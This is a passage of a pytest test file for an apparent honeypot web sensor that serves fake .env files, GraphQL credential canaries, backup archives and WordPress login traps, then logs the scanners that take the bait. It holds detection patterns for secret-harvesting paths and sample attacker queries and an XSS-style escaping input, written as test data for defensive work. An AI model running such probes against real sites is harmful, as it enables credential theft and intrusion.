    monkeypatch.setattr(tbenv, "API_KEY", "")
    for path in ["/.env", "/.git/config", "/v1/models"]:
        kind = tbenv.openapi_swagger_kind(path)
        assert kind == "", f"{path} unexpectedly matched as {kind}"


# --- Fake GraphQL endpoint -----------------------------------------------


def test_graphql_enabled_by_default():
    """Cheap, low FP risk, modern API surface — default on."""
    assert tbenv.GRAPHQL_ENABLED


@pytest.mark.parametrize("path", [
    "/graphql",
    "/graphql/",
    "/api/graphql",
    "/api/graphql/",
    "/graphql/api",
    "/api/gql",
    "/gql",
    "/v1/graphql",
    "/api/v1/graphql",
    "/query",
    "/api/query",
])
def test_graphql_default_paths_match(path):
    assert tbenv.is_graphql_path(path), f"{path} should match"


def test_graphql_path_case_insensitive():
    assert tbenv.is_graphql_path("/GraphQL")
    assert tbenv.is_graphql_path("/API/GraphQL")
    assert tbenv.is_graphql_path("/V1/GRAPHQL")


@pytest.mark.parametrize("path", [
    "/",
    "/graphql.json",         # `/graphql/.env`-shape scrape leaks the host
    "/graphqlx",
    "/api/graph",
    "/api/v2/graphql",
    "/.env",
    "/.git/config",
])
def test_graphql_path_non_match(path):
    assert not tbenv.is_graphql_path(path)


def test_graphql_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "GRAPHQL_ENABLED", False)
    assert not tbenv.is_graphql_path("/graphql")
    assert not tbenv.is_graphql_path("/api/graphql")


@pytest.mark.parametrize("query,expected", [
    ("query IntrospectionQuery { __schema { types { name } } }", "introspection"),
    ("{ __type(name: \"User\") { fields { name } } }", "introspection"),
    ("query { __schema { queryType { name } } }", "introspection"),
    ("mutation { login(username: \"admin\", password: \"x\") { token } }", "auth-mutation"),
    ("mutation Login($u:String!,$p:String!) { signIn(email:$u,password:$p) { token } }", "auth-mutation"),
    ("mutation { createUser(input: { username: \"a\", email: \"b\", password: \"c\" }) { id } }", "auth-mutation"),
    ("{ currentUser { id apiToken awsAccessKeyId } }", "credential-field"),
    ("{ viewer { accessToken refreshToken } }", "credential-field"),
    ("mutation { setSetting(key: \"x\", value: \"y\") }", "mutation"),
    ("{ users { id email } }", "query"),
    ("", ""),
])
def test_graphql_classify_query(query, expected):
    assert tbenv._graphql_classify(query) == expected


def test_graphql_extract_query_from_json_body():
    body = json.dumps({"query": "{ __schema { types { name } } }"}).encode("utf-8")
    assert "__schema" in tbenv._graphql_extract_query(body, "application/json", "")


def test_graphql_extract_query_from_application_graphql_body():
    body = b"query Introspection { __schema { types { name } } }"
    assert "__schema" in tbenv._graphql_extract_query(body, "application/graphql", "")


def test_graphql_extract_query_from_query_string():
    assert (
        tbenv._graphql_extract_query(b"", "", "query=%7B__schema%7Btypes%7Bname%7D%7D%7D")
        == "{__schema{types{name}}}"
    )


def test_graphql_extract_query_batched_request():
    body = json.dumps([
        {"query": "{ __schema { types { name } } }"},
        {"query": "{ currentUser { apiToken } }"},
    ]).encode("utf-8")
    extracted = tbenv._graphql_extract_query(body, "application/json", "")
    assert "__schema" in extracted
    assert "apiToken" in extracted


def test_graphql_extract_username_inline_literal():
    q = 'mutation { login(username: "admin@example.com", password: "x") { token } }'
    assert tbenv._graphql_extract_username(q, b"") == "admin@example.com"


def test_graphql_extract_username_from_variables():
    body = json.dumps({
        "query": "mutation Login($u:String!,$p:String!) { login(username:$u,password:$p){token} }",
        "variables": {"u": "shipped-test@example.com", "p": "secret"},
        "operationName": "Login",
    }).encode("utf-8")
    # username is in `u` variable; the renderer tries common keys; check the
    # explicit `username` key path
    body2 = json.dumps({
        "query": "mutation { login(username:$username,password:$password){token} }",
        "variables": {"username": "user-via-vars", "password": "secret"},
    }).encode("utf-8")
    assert tbenv._graphql_extract_username("", body2) == "user-via-vars"


def test_graphql_redact_passwords_strips_inline_literal():
    """Password literals must be redacted from any query preview that
    lands in the log. Field name stays so triage can still see the
    operation shape; value is replaced with `[REDACTED]`."""
    q = 'mutation { login(username: "u@e.com", password: "hunter2") { token } }'
    redacted = tbenv._graphql_redact_passwords(q)
    assert "hunter2" not in redacted
    assert "[REDACTED]" in redacted
    assert "u@e.com" in redacted   # username stays
    assert "password:" in redacted  # field name stays


def test_graphql_has_password_detects_inline_and_vars():
    assert tbenv._graphql_has_password('login(password: "x")', b"")
    body = json.dumps({
        "query": "mutation Login($username:String!,$password:String!) { login(username:$username,password:$password){token} }",
        "variables": {"username": "a", "password": "secret"},
    }).encode("utf-8")
    assert tbenv._graphql_has_password("", body)


def test_graphql_introspection_response_lists_credential_fields():
    """The schema returned to introspection must name the credential-shaped
    fields a scraper walks (apiToken / awsAccessKeyId / secretKey).
    A field set that omits them would defeat the canary bait at the
    follow-on data hop."""
    body = tbenv.render_graphql_introspection_response()
    payload = json.loads(body)
    types = {t["name"]: t for t in payload["data"]["__schema"]["types"]}
    user_fields = {f["name"] for f in types["User"]["fields"]}
    for field in ("apiToken", "awsAccessKeyId", "awsSecretAccessKey", "refreshToken", "webhookSecret"):
        assert field in user_fields, f"User type missing credential bait field {field}"


def test_graphql_user_canary_embeds_aws_in_token_slots():
    body = tbenv.render_graphql_user_canary(FAKE_TRACEBIT)
    payload = json.loads(body)
    user = payload["data"]["currentUser"]
    access_key = FAKE_TRACEBIT["aws"]["awsAccessKeyId"]
    secret_key = FAKE_TRACEBIT["aws"]["awsSecretAccessKey"]
    # All four scraper-favourite slots carry the canary access key
    assert user["apiToken"] == access_key
    assert user["accessToken"] == access_key
    assert user["awsAccessKeyId"] == access_key
    assert user["awsSecretAccessKey"] == secret_key
    assert user["secretKey"] == secret_key
    # refreshToken / webhookSecret are per-hit random — must not be the
    # canary string (zero detection value on replay) and must not be a
    # fixed literal across calls
    body2 = tbenv.render_graphql_user_canary(FAKE_TRACEBIT)
    payload2 = json.loads(body2)
    assert user["refreshToken"] != access_key
    assert user["refreshToken"] != payload2["data"]["currentUser"]["refreshToken"]
    assert user["webhookSecret"] != payload2["data"]["currentUser"]["webhookSecret"]


def test_graphql_auth_payload_embeds_aws_token():
    body = tbenv.render_graphql_auth_payload(FAKE_TRACEBIT)
    payload = json.loads(body)
    access_key = FAKE_TRACEBIT["aws"]["awsAccessKeyId"]
    assert payload["data"]["login"]["token"] == access_key
    # refreshToken is per-hit synthetic
    body2 = tbenv.render_graphql_auth_payload(FAKE_TRACEBIT)
    payload2 = json.loads(body2)
    assert payload["data"]["login"]["refreshToken"] != payload2["data"]["login"]["refreshToken"]


def test_graphql_generic_error_has_no_data_key():
    """Real graphql error shape: only `errors`, no `data`. A `data: null`
    leaks "I'm an error envelope but I tried to resolve" which a few
    introspection-walking tools fingerprint on."""
    payload = json.loads(tbenv.render_graphql_generic_error("Cannot query"))
    assert "errors" in payload
    assert "data" not in payload
    assert payload["errors"][0]["message"] == "Cannot query"


async def test_dispatch_graphql_get_returns_graphiql(flux_client):
    resp = await flux_client.get("/graphql", headers={"X-Forwarded-For": "203.0.113.91"})
    assert resp.status == 200
    assert "text/html" in resp.headers["Content-Type"]
    body = await resp.read()
    assert b"GraphiQL" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "graphql-playground"
    assert entries[-1]["graphqlMethod"] == "GET"


async def test_dispatch_graphql_introspection_post(flux_client, monkeypatch):
    """Introspection response must list `User.apiToken`-class fields and
    must NOT issue a canary (canary fires on the follow-on data hop)."""
    issued = []

    async def tracking_canary(*args, **kwargs):
        issued.append(args)
        return FAKE_TRACEBIT

    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", tracking_canary)
    payload = json.dumps({
        "query": "query IntrospectionQuery { __schema { types { name fields { name } } } }",
        "operationName": "IntrospectionQuery",
    })
    resp = await flux_client.post(
        "/graphql",
        data=payload,
        headers={"Content-Type": "application/json", "X-Forwarded-For": "203.0.113.92"},
    )
    assert resp.status == 200
    assert "application/json" in resp.headers["Content-Type"]
    body = await resp.read()
    j = json.loads(body)
    assert "__schema" in j["data"]
    assert not issued, "Introspection must not burn a canary"
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "graphql-introspection"
    assert entries[-1]["graphqlClassification"] == "introspection"
    assert entries[-1]["graphqlOperationName"] == "IntrospectionQuery"


async def test_dispatch_graphql_credential_field_query_issues_canary(
    flux_client, monkeypatch,
):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    payload = json.dumps({
        "query": "{ currentUser { id username apiToken awsAccessKeyId awsSecretAccessKey } }",
    })
    resp = await flux_client.post(
        "/api/graphql",
        data=payload,
        headers={"Content-Type": "application/json", "X-Forwarded-For": "203.0.113.93"},
    )
    assert resp.status == 200
    body = await resp.read()
    j = json.loads(body)
    access_key = FAKE_TRACEBIT["aws"]["awsAccessKeyId"]
    assert j["data"]["currentUser"]["apiToken"] == access_key
    assert j["data"]["currentUser"]["awsAccessKeyId"] == access_key
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "graphql-credential-canary"
    assert entries[-1]["canaryStatus"] == "issued"
    assert "aws" in entries[-1]["canaryTypes"]


async def test_dispatch_graphql_auth_mutation_captures_username(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    payload = json.dumps({
        "query": "mutation { login(username: \"victim@example.com\", password: \"hunter2\") { token user { id } } }",
    })
    resp = await flux_client.post(
        "/api/gql",
        data=payload,
        headers={"Content-Type": "application/json", "X-Forwarded-For": "203.0.113.94"},
    )
    assert resp.status == 200
    body = await resp.read()
    j = json.loads(body)
    assert j["data"]["login"]["token"] == FAKE_TRACEBIT["aws"]["awsAccessKeyId"]
    entries = _log_entries(flux_client.log_path)
    last = entries[-1]
    assert last["result"] == "graphql-auth-canary"
    assert last["graphqlUsername"] == "victim@example.com"
    assert last["graphqlHasPassword"] is True
    assert "hunter2" not in json.dumps(last), "password value must not be logged"


async def test_dispatch_graphql_auth_mutation_no_api_key_returns_error(
    flux_client, monkeypatch,
):
    """Without TRACEBIT_API_KEY we still log the username + has-password
    but return an `Invalid credentials` envelope rather than a stale
    canary. No `data` key in the response — pure errors envelope."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    payload = json.dumps({
        "query": "mutation { login(username: \"user2@example.com\", password: \"x\") { token } }",
    })
    resp = await flux_client.post(
        "/graphql/api",
        data=payload,
        headers={"Content-Type": "application/json", "X-Forwarded-For": "203.0.113.95"},
    )
    assert resp.status == 200
    j = json.loads(await resp.read())
    assert "errors" in j
    assert "data" not in j
    entries = _log_entries(flux_client.log_path)
    last = entries[-1]
    assert last["result"] == "graphql-auth-error"
    assert last["graphqlUsername"] == "user2@example.com"
    assert last["graphqlHasPassword"] is True


async def test_dispatch_graphql_empty_body_returns_syntax_error(flux_client):
    resp = await flux_client.post(
        "/graphql",
        data=b"",
        headers={"Content-Type": "application/json", "X-Forwarded-For": "203.0.113.96"},
    )
    assert resp.status == 200
    j = json.loads(await resp.read())
    assert "errors" in j
    assert "data" not in j
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "graphql-syntax-error"


async def test_dispatch_graphql_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "GRAPHQL_ENABLED", False)
    resp = await flux_client.post(
        "/graphql",
        data=b'{"query":"{__schema{types{name}}}"}',
        headers={"Content-Type": "application/json", "X-Forwarded-For": "203.0.113.97"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Backup-archive canary trap ---


def test_backup_archive_enabled_by_default():
    assert tbenv.BACKUP_ARCHIVE_ENABLED


@pytest.mark.parametrize("path,ext", [
    # Standard dictionary base names.
    ("/backup.zip", "zip"),
    ("/backup.tar.gz", "tar.gz"),
    ("/database.zip", "zip"),
    ("/db.sql.gz", "sql.gz"),
    ("/www.tar.gz", "tar.gz"),
    ("/site.tar.gz", "tar.gz"),
    ("/wordpress.zip", "zip"),
    ("/wp-content.tar.gz", "tar.gz"),
    ("/public_html.tar.gz", "tar.gz"),
    ("/htdocs.zip", "zip"),
    ("/.env.zip", "zip"),
    ("/secrets.tar.gz", "tar.gz"),
    ("/full_backup.tar.bz2", "tar.bz2"),
    ("/archive.7z", "7z"),
    ("/backup.rar", "rar"),
    ("/db.tar.xz", "tar.xz"),
    ("/code.tgz", "tgz"),
    # IP-octet / numeric synthesis shapes — the novel scanner-side
    # filename generation observed in May 2026.
    ("/65.20.84.180.tar.gz", "tar.gz"),
    ("/84.180.tar.gz", "tar.gz"),
    ("/84.tar.gz", "tar.gz"),
    ("/65.20.84.180.zip", "zip"),
    ("/84.180.sql.gz", "sql.gz"),
    # Year / yearmonth / yearmonthday synthesis shapes.
    ("/2026.tar.gz", "tar.gz"),
    ("/2025.zip", "zip"),
    ("/202603.tar.gz", "tar.gz"),
    ("/20260310.zip", "zip"),
])
def test_is_backup_archive_path_matches(path, ext):
    assert tbenv.is_backup_archive_path(path), f"expected match: {path}"
    assert tbenv._backup_archive_match(path) == ext


@pytest.mark.parametrize("path", [
    # Non-archive extensions.
    "/backup.php",
    "/backup.html",
    "/backup",
    "/database",
    # Unknown base names without IP / date shape.
    "/randomgarbage.tar.gz",
    "/x.zip",
    "/qzzzzzzzzz.7z",
    # Empty / weird shapes.
    "/.tar.gz",
    "/",
    "//backup.zip",  # double-slash isn't accepted by the regex
])
def test_is_backup_archive_path_non_match(path):
    assert not tbenv.is_backup_archive_path(path), f"unexpected match: {path}"


def test_is_backup_archive_path_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "BACKUP_ARCHIVE_ENABLED", False)
    assert not tbenv.is_backup_archive_path("/backup.tar.gz")


def test_build_backup_archive_body_zip_is_valid_zip():
    body, ct = tbenv._build_backup_archive_body(FAKE_TRACEBIT, "zip")
    assert ct == "application/zip"
    import io as _io, zipfile as _zf
    with _zf.ZipFile(_io.BytesIO(body)) as z:
        names = z.namelist()
        assert ".env" in names
        assert "backup.sql" in names
        env_content = z.read(".env")
        assert b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in env_content
        assert b"AWS_SECRET_ACCESS_KEY=" in env_content


def test_build_backup_archive_body_tar_gz_is_valid_tar_gz():
    body, ct = tbenv._build_backup_archive_body(FAKE_TRACEBIT, "tar.gz")
    assert ct == "application/gzip"
    import io as _io, tarfile as _tf
    with _tf.open(fileobj=_io.BytesIO(body), mode="r:gz") as t:
        names = t.getnames()
        assert ".env" in names
        assert "backup.sql" in names
        env_member = t.extractfile(".env")
        assert env_member is not None
        env_content = env_member.read()
        assert b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in env_content


def test_build_backup_archive_body_sql_gz_is_gzipped_sql():
    body, ct = tbenv._build_backup_archive_body(FAKE_TRACEBIT, "sql.gz")
    assert ct == "application/gzip"
    import gzip as _gz
    plain = _gz.decompress(body)
    assert b"-- MySQL dump" in plain
    assert b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in plain


@pytest.mark.parametrize("ext_family", [
    "tar.gz", "tar.bz2", "tar.xz", "tar", "tgz",
    "sql.gz", "sql.bz2", "sql", "gz", "bz2", "xz",
    "zip", "7z", "rar", "zst",
])
def test_build_backup_archive_body_embeds_canary(ext_family):
    """Across every supported extension family, the rendered body must
    contain the canary AWS access key id when decoded with the
    appropriate codec. Harvesters that grep raw bytes still find it
    for `.7z` / `.rar` / `.zst` (we serve tar.gz under the claimed
    Content-Type for those)."""
    body, ct = tbenv._build_backup_archive_body(FAKE_TRACEBIT, ext_family)
    assert isinstance(body, bytes) and len(body) > 0
    # Decode if we can; otherwise grep raw bytes.
    if ext_family == "zip":
        import io as _io, zipfile as _zf
        with _zf.ZipFile(_io.BytesIO(body)) as z:
            assert b"AKIAFAKEEXAMPLE01" in z.read(".env")
    elif ext_family in ("tar.gz", "tgz", "7z", "rar", "zst"):
        import io as _io, tarfile as _tf
        with _tf.open(fileobj=_io.BytesIO(body), mode="r:gz") as t:
            env_m = t.extractfile(".env")
            assert env_m is not None
            assert b"AKIAFAKEEXAMPLE01" in env_m.read()
    elif ext_family in ("tar.bz2", "tbz2"):
        import io as _io, tarfile as _tf
        with _tf.open(fileobj=_io.BytesIO(body), mode="r:bz2") as t:
            assert b"AKIAFAKEEXAMPLE01" in t.extractfile(".env").read()
    elif ext_family in ("tar.xz", "txz"):
        import io as _io, tarfile as _tf
        with _tf.open(fileobj=_io.BytesIO(body), mode="r:xz") as t:
            assert b"AKIAFAKEEXAMPLE01" in t.extractfile(".env").read()
    elif ext_family == "tar":
        import io as _io, tarfile as _tf
        with _tf.open(fileobj=_io.BytesIO(body), mode="r:") as t:
            assert b"AKIAFAKEEXAMPLE01" in t.extractfile(".env").read()
    elif ext_family == "sql.gz":
        import gzip as _gz
        assert b"AKIAFAKEEXAMPLE01" in _gz.decompress(body)
    elif ext_family == "sql.bz2":
        import bz2 as _bz2
        assert b"AKIAFAKEEXAMPLE01" in _bz2.decompress(body)
    elif ext_family == "sql":
        assert b"AKIAFAKEEXAMPLE01" in body
    elif ext_family == "gz":
        import gzip as _gz
        assert b"AKIAFAKEEXAMPLE01" in _gz.decompress(body)
    elif ext_family == "bz2":
        import bz2 as _bz2
        assert b"AKIAFAKEEXAMPLE01" in _bz2.decompress(body)
    elif ext_family == "xz":
        import lzma as _lzma
        assert b"AKIAFAKEEXAMPLE01" in _lzma.decompress(body)


def test_build_backup_archive_body_per_hit_db_password_is_unique():
    """The fake DB password embedded in the .sql / .env body must
    differ between renders so the archive isn't a fleet-wide
    fingerprint."""
    body_a, _ = tbenv._build_backup_archive_body(FAKE_TRACEBIT, "zip")
    body_b, _ = tbenv._build_backup_archive_body(FAKE_TRACEBIT, "zip")
    assert body_a != body_b, "two backup-archive renders identical — DB password not random"


@pytest.mark.parametrize("path,ext_family,expected_ct", [
    ("/backup.zip", "zip", "application/zip"),
    ("/database.tar.gz", "tar.gz", "application/gzip"),
    ("/db.sql.gz", "sql.gz", "application/gzip"),
    ("/full_backup.tar.bz2", "tar.bz2", "application/x-bzip2"),
    ("/archive.7z", "7z", "application/x-7z-compressed"),
    ("/65.20.84.180.tar.gz", "tar.gz", "application/gzip"),
    ("/2026.zip", "zip", "application/zip"),
])
async def test_dispatch_routes_backup_archive_to_trap(
    flux_client, monkeypatch, path, ext_family, expected_ct,
):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "BACKUP_ARCHIVE_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.50"})
    assert resp.status == 200
    assert resp.headers["Content-Type"] == expected_ct
    assert resp.headers["Cache-Control"] == "no-store"
    assert "Content-Disposition" in resp.headers
    body = await resp.read()
    assert len(body) > 0
    # AKIA literal should be reachable somewhere in the bytes for
    # archive formats we can actually decode without going via the
    # codec (raw .sql, .zip central-dir comment, tar header bytes
    # — for compressed formats it's encoded so we don't grep raw).
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "backup-archive"
    assert entries[-1]["archiveExt"] == ext_family


async def test_dispatch_backup_archive_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "BACKUP_ARCHIVE_ENABLED", False)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get("/backup.tar.gz", headers={"X-Forwarded-For": "203.0.113.51"})
    assert resp.status == 404


async def test_dispatch_backup_archive_without_api_key_returns_404(flux_client, monkeypatch):
    """No TRACEBIT_API_KEY → the trap stays silent (consistent with
    `/.env` / fake-git behaviour)."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    monkeypatch.setattr(tbenv, "BACKUP_ARCHIVE_ENABLED", True)
    resp = await flux_client.get("/backup.tar.gz", headers={"X-Forwarded-For": "203.0.113.52"})
    assert resp.status == 404


async def test_dispatch_backup_archive_does_not_shadow_exact_canary_paths(
    flux_client, monkeypatch,
):
    """`/backup.sql` is the existing sql-dump CanaryTrap exact-path
    entry; the backup-archive pattern matcher must run AFTER the
    canary-trap lookup so that path still routes to sql-dump (not
    the pattern handler's `sql` family)."""
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "BACKUP_ARCHIVE_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get("/backup.sql", headers={"X-Forwarded-For": "203.0.113.53"})
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "sql-dump"  # not "backup-archive"


# --- Heroku / .NET / IIS / Composer / Dockerfile canary traps ---


@pytest.mark.parametrize("path,needle", [
    ("/procfile", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/heroku.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/heroku.yaml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/app.json", b'"value": "AKIAFAKEEXAMPLE01"'),
    ("/appsettings.json", b'"AccessKey": "AKIAFAKEEXAMPLE01"'),
    ("/appsettings.production.json", b'"AccessKey": "AKIAFAKEEXAMPLE01"'),
    ("/appsettings.development.json", b'"AccessKey": "AKIAFAKEEXAMPLE01"'),
    ("/appsettings.staging.json", b'"AccessKey": "AKIAFAKEEXAMPLE01"'),
    ("/web.config", b'value="AKIAFAKEEXAMPLE01"'),
    ("/web.config.bak", b'value="AKIAFAKEEXAMPLE01"'),
    ("/auth.json", b'"username": "deploybot42"'),
    ("/auth.json", b'"password": "p@ssCanaryValue"'),
    ("/dockerfile", b"ARG AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/dockerfile.prod", b"ARG AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/containerfile", b"ARG AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
])
def test_heroku_tier_renderers_embed_canary(path, needle):
    trap = tbenv._TRAP_BY_PATH[path]
    body = trap.render(FAKE_TRACEBIT)
    assert needle in body, f"expected {needle!r} in rendered {path}; got {body[:300]!r}"


@pytest.mark.parametrize("path", [
    "/appsettings.json",
    "/web.config",
])
def test_heroku_tier_renderers_emit_per_hit_db_password(path):
    """The DB password / machine key in these renderers must vary per
    render so two sensors don't ship the same bytes."""
    trap = tbenv._TRAP_BY_PATH[path]
    body_1 = trap.render(FAKE_TRACEBIT)
    body_2 = trap.render(FAKE_TRACEBIT)
    assert body_1 != body_2, f"{path} renders identically — DB password / key not randomized"


@pytest.mark.parametrize("path,expected_result", [
    ("/Procfile", "procfile"),
    ("/heroku.yml", "heroku-yml"),
    ("/app.json", "heroku-app-json"),
    ("/appsettings.json", "appsettings-json"),
    ("/AppSettings.json", "appsettings-json"),  # case-insensitive
    ("/Web.config", "iis-web-config"),
    ("/auth.json", "composer-auth-json"),
    ("/Dockerfile", "dockerfile"),
    ("/Dockerfile.prod", "dockerfile"),
])
async def test_dispatch_routes_heroku_tier_paths_to_trap(
    flux_client, monkeypatch, path, expected_result,
):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.60"})
    assert resp.status == 200
    body = await resp.read()
    assert b"AKIAFAKEEXAMPLE01" in body or b"deploybot42" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == expected_result


# --- WordPress wp-login canary ---


def test_wp_login_enabled_by_default():
    assert tbenv.WP_LOGIN_ENABLED


@pytest.mark.parametrize("path", [
    "/wp-login.php",
    "/wp-login.PHP",
])
def test_wp_login_path_match(path):
    assert tbenv.is_wp_login_path(path)


@pytest.mark.parametrize("path", [
    "/wp-login.php.bak", "/login", "/wp-login", "/.env",
])
def test_wp_login_path_no_match(path):
    assert not tbenv.is_wp_login_path(path)


@pytest.mark.parametrize("path", [
    "/wp-admin/",
    "/wp-admin/index.php",
    "/wp-admin/admin.php",
    "/wp-admin/profile.php",
    "/wp-admin/admin-ajax.php",
    "/wp-admin/install.php",
])
def test_wp_admin_path_match(path):
    assert tbenv.is_wp_admin_path(path)


@pytest.mark.parametrize("path", [
    "/wp-admin", "/wp-admin/css/colors.css", "/login",
])
def test_wp_admin_path_no_match(path):
    assert not tbenv.is_wp_admin_path(path)


def test_wp_login_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "WP_LOGIN_ENABLED", False)
    assert not tbenv.is_wp_login_path("/wp-login.php")
    assert not tbenv.is_wp_admin_path("/wp-admin/index.php")


def test_wp_login_render_html_includes_nonce_and_form_fields():
    body = tbenv.render_wp_login_html(nonce="abc123", redirect_to="/wp-admin/")
    assert b'name="_wpnonce"' in body
    assert b'value="abc123"' in body
    assert b'name="log"' in body
    assert b'name="pwd"' in body
    assert b'name="testcookie"' in body
    assert b'name="wp-submit"' in body
    assert b'action="/wp-login.php"' in body
    assert b'name="redirect_to"' in body


def test_wp_login_render_escapes_nonce():
    body = tbenv.render_wp_login_html(nonce='"><script>x', redirect_to="/wp-admin/")
    assert b"<script>" not in body
    assert b"&quot;" in body


def test_wp_login_nonce_store_and_check():
    tbenv._WP_LOGIN_NONCE_CACHE.clear()
    tbenv._wp_login_nonce_store("10.0.0.1", "nonce1")
    assert tbenv._wp_login_nonce_check("10.0.0.1", "nonce1")
    assert not tbenv._wp_login_nonce_check("10.0.0.1", "wrong")
    assert not tbenv._wp_login_nonce_check("10.0.0.2", "nonce1")
    tbenv._WP_LOGIN_NONCE_CACHE.clear()


def test_wp_login_extract_creds():
    body = b"log=admin&pwd=hunter2&_wpnonce=abc123&testcookie=1&redirect_to=/wp-admin/&wp-submit=Log+In"
    result = tbenv.extract_wp_login_creds(body, "application/x-www-form-urlencoded")
    assert result["log"] == "admin"
    assert result["hasPwd"] == "true"
    assert result["_wpnonce"] == "abc123"
    assert result["testcookie"] == "1"
    assert result["redirect_to"] == "/wp-admin/"
    assert "pwd" not in result


async def test_dispatch_get_wp_login_returns_login_page(flux_client, monkeypatch):
    resp = await flux_client.get(
        "/wp-login.php", headers={"X-Forwarded-For": "203.0.113.70"},
    )
    assert resp.status == 200
    assert resp.headers["Content-Type"].startswith("text/html")
    body = await resp.read()
    assert b'name="log"' in body
    assert b'name="_wpnonce"' in body
    entries = _log_entries(flux_client.log_path)
    assert len(entries) == 1
    assert entries[0]["result"] == "wp-login-probe"
    assert entries[0]["status"] == 200
    assert "wpLoginNonceIssued" in entries[0]


async def test_dispatch_post_wp_login_captures_credentials(flux_client, monkeypatch):
    resp = await flux_client.get(
        "/wp-login.php", headers={"X-Forwarded-For": "203.0.113.71"},
    )
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    nonce = entries[-1]["wpLoginNonceIssued"]

    resp = await flux_client.post(
        "/wp-login.php",
        data=f"log=admin&pwd=secret&_wpnonce={nonce}&testcookie=1",
        headers={
            "X-Forwarded-For": "203.0.113.71",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "wordpress_test_cookie=WP+Cookie+check",
        },
        allow_redirects=False,
    )
    assert resp.status == 302
    assert resp.headers["Location"] == "/wp-login.php?reauth=1"
    entries = _log_entries(flux_client.log_path)
    post_entry = entries[-1]
    assert post_entry["result"] == "wp-login-credentials"
    assert post_entry["wpLoginUsername"] == "admin"
    assert post_entry["wpLoginHasPwd"] is True
    assert post_entry["wpLoginNonceMatch"] is True
    assert post_entry["wpLoginTestcookiePresent"] is True


async def test_dispatch_post_wp_login_without_nonce_echo(flux_client, monkeypatch):
    resp = await flux_client.post(
        "/wp-login.php",
        data="log=bob&pwd=pass123",
        headers={
            "X-Forwarded-For": "203.0.113.72",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        allow_redirects=False,
    )
    assert resp.status == 302
    entries = _log_entries(flux_client.log_path)
    post_entry = entries[-1]
    assert post_entry["result"] == "wp-login-credentials"
    assert post_entry["wpLoginUsername"] == "bob"
    assert post_entry["wpLoginNonceMatch"] is False
    assert post_entry["wpLoginTestcookiePresent"] is False


async def test_dispatch_get_wp_admin_redirects_to_login(flux_client, monkeypatch):
    resp = await flux_client.get(
        "/wp-admin/index.php",
        headers={"X-Forwarded-For": "203.0.113.73"},
        allow_redirects=False,
    )
    assert resp.status == 302
    assert "/wp-login.php?" in resp.headers["Location"]
    assert "redirect_to=" in resp.headers["Location"]
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "wp-admin-redirect"


async def test_dispatch_wp_login_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "WP_LOGIN_ENABLED", False)
    resp = await flux_client.get(
        "/wp-login.php", headers={"X-Forwarded-For": "203.0.113.74"},
    )
    assert resp.status == 404


# --- WordPress user-enumeration trap ---


def test_wp_user_enum_enabled_by_default():
    assert tbenv.WP_USER_ENUM_ENABLED


@pytest.mark.parametrize("path", [
    "/wp-json/wp/v2/users",
    "/wp-json/wp/v2/users/",
    "/wp-json/wp/v2/users?per_page=100",
    "/wp-json/wp/v2/users?context=embed",
    "/wp-json/wp/v2/users/1",
    "/wp-json/wp/v2/users/2",
    "/wp-json/wp/v2/users/3",
    "/wp-json/WP/v2/Users",
    "/wp-sitemap-users-1.xml",
    "/wp-sitemap-users-2.xml",
    "/wp-sitemap-users-12.xml",
    "/author-sitemap.xml",
    "/author-sitemap1.xml",
